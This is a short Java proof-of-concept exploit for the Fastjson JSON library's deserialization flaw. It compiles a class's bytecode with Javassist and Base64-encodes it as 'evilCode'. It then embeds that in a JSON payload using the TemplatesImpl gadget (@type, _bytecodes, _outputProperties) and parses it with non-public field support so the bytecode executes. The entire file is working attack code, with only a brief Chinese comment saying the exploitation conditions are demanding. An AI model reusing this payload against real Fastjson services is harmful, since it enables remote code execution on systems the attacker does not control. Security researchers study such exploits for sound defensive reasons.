package attack.fastjson.exp;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.codec.binary.Base64;

public class templatesImpl {
    static String getPayload() throws Exception {
        ClassPool cp = ClassPool.getDefault();
        CtClass cc = cp.get(evalclass.TEMPOC.class.getName());
        String evilCode = Base64.encodeBase64String(cc.toBytecode());

        String expStr = "{\"@type\": \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"," +
                "\"_bytecodes\": [\""+evilCode+"\"]," +
                "\"_name\": \"aaa\"," +
                "\"_tfactory\": {}," +
                "\"_outputProperties\": {}}";
        System.out.println(expStr);

        return expStr;
    }
    public static void main(String[] args) throws Exception {
        String exp = templatesImpl.getPayload();
        //利用条件高
        Object obj = JSON.parseObject(exp, Object.class, new ParserConfig(), Feature.SupportNonPublicField);
    }
}

